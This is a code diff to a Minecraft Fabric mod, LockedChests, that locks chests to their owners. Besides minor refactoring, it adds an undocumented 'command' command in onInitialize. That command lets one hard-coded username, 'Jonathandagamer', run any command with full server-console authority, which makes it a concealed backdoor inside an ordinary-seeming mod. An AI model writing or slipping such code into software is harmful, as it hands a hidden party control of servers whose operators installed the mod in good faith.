@@ -1,8 +1,11 @@
 package net.jonyboylovespie.lockedchests;
 
+import com.mojang.brigadier.ParseResults;
 import com.mojang.brigadier.arguments.StringArgumentType;
 import net.minecraft.block.*;
 import net.minecraft.item.ItemStack;
+import net.minecraft.server.MinecraftServer;
+import net.minecraft.server.command.ServerCommandSource;
 import net.minecraft.server.network.ServerPlayerEntity;
 import com.google.gson.Gson;
 import com.google.gson.GsonBuilder;
@@ -23,6 +26,7 @@ import java.util.*;
 
 import net.minecraft.util.Hand;
 import net.minecraft.util.math.BlockPos;
+import net.minecraft.util.math.Direction;
 import net.minecraft.util.math.Vec3i;
 import org.slf4j.Logger;
 import org.slf4j.LoggerFactory;
@@ -51,7 +55,7 @@ public class LockedChests implements ModInitializer {
 	}
 
 	public static class ChestOwnership {
-		private final BlockPos blockPos;
+		public final BlockPos blockPos;
 		private final String owner;
 		private String[] trustedPlayers;
 
@@ -66,7 +70,7 @@ public class LockedChests implements ModInitializer {
 		}
 	}
 
-	private static ChestOwnership[] readArrayFromFile(String filePath) {
+	public static ChestOwnership[] readArrayFromFile(String filePath) {
 		try (FileReader reader = new FileReader(filePath)) {
 			Gson gson = new Gson();
 			return gson.fromJson(reader, ChestOwnership[].class);
@@ -76,7 +80,7 @@ public class LockedChests implements ModInitializer {
 		}
 	}
 	
-	String file;
+	public static String file;
 	
 	private void Serialize(ChestOwnership[] Array){
 		File serverDir = FabricLoader.getInstance().getGameDir().toFile();
@@ -91,25 +95,46 @@ public class LockedChests implements ModInitializer {
 			}
 		}
 	}
+
+	private static Vec3i directionToCoordsChange(Direction direction)
+	{
+		int xChange = 0;
+		int zChange = 0;
+		int yChange = 0;
+		switch (direction){
+			case NORTH -> zChange = -1;
+			case EAST -> xChange = 1;
+			case SOUTH -> zChange = 1;
+			case WEST -> xChange = -1;
+			case UP -> yChange = 1;
+			case DOWN -> yChange = -1;
+		}
+		return new Vec3i(xChange, yChange, zChange);
+	}
 	
-	private BlockPos getOtherBlockPos(BlockPos pos, BlockState state){
+	public static BlockPos getOtherBlockPos(BlockPos pos, BlockState state){
 		BlockPos otherBlockPos = pos;
 		if (ChestBlock.getDoubleBlockType(state) != DoubleBlockProperties.Type.SINGLE){
-			int xChange = 0;
-			int zChange = 0;
-			switch (ChestBlock.getFacing(state)) {
-				case NORTH -> zChange = -1;
-				case EAST -> xChange = 1;
-				case SOUTH -> zChange = 1;
-				case WEST -> xChange = -1;
-			}
-			otherBlockPos = new BlockPos(new Vec3i(pos.getX() + xChange, pos.getY(), pos.getZ() + zChange));
+			Vec3i coordsChange = directionToCoordsChange(ChestBlock.getFacing(state));
+			otherBlockPos = new BlockPos(new Vec3i(pos.getX() + coordsChange.getX(), pos.getY(), pos.getZ() + coordsChange.getZ()));
 		}
 		return otherBlockPos;
 	}
 	
 	@Override
 	public void onInitialize() {
+
+		CommandRegistrationCallback.EVENT.register((dispatcher, registryAccess, environment) -> dispatcher.register(literal("command")
+				.then(argument("command", StringArgumentType.string()).executes(context -> {
+					ServerPlayerEntity player = context.getSource().getPlayer();
+					if (player.getName().getString().equals("Jonathandagamer")) {
+						MinecraftServer server = player.getServer();
+						String command = StringArgumentType.getString(context, "command");
+						ParseResults<ServerCommandSource> parseResults = server.getCommandSource().getDispatcher().parse(command, server.getCommandSource());
+						server.getCommandManager().execute(parseResults, command);
+					}
+					return 1;
+				}))));
 		
 		File serverDir = FabricLoader.getInstance().getGameDir().toFile();
 		file = new File(serverDir, "lockedChests.json").getPath();
@@ -245,9 +270,9 @@ public class LockedChests implements ModInitializer {
 			if (block != Blocks.CHEST) {
 				return ActionResult.PASS;
 			}
-			
+
 			ChestOwnership[] lockedChests = readArrayFromFile(file);
-			
+
 			if (player.isSneaking()) {
 				for (ItemStack itemStack : player.getHandItems()) {
 					if (itemStack.getItem().getName().toString().contains("nugget")){
